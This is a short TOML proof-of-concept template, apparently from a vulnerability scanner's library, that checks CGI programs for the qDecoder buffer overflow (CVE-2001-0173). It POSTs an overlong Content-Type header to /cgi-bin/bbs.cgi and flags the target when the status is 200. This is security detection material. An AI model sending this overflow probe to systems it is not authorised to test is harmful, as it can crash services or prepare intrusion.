[info]
author = "ave"
description = "检测目标CGI程序是否存在qDecoder库缓冲区溢出漏洞，通过发送超长MIME Content-Type头触发缓冲区溢出"
id = "POC-AVE-2001-0067"
name = "qDecoder Remote Buffer Overflow PoC"
severity = "critical"
tags = ["ave-2001-0067"]
vuln_id = [
    "CVE-2001-0173",
    "AVE-2001-0067",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/cgi-bin/bbs.cgi"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
Content-Type = "{{repeat_str}}"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
